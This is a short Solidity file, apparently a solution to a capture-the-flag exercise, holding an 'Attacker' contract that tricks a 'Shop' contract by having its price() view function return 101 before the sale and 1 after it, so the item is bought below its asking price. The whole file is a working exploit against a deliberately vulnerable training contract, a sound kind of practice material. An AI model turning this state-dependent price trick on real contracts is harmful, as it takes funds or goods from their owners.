// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Shop.sol";

contract Attacker is Buyer {
    Shop public target;

    constructor(address _target) public {
        target = Shop(_target);
    }
    function price() external view override returns (uint256) {
        return target.isSold() ? 1 : 101;
    }
    function attack() public {
        target.buy();
    }
}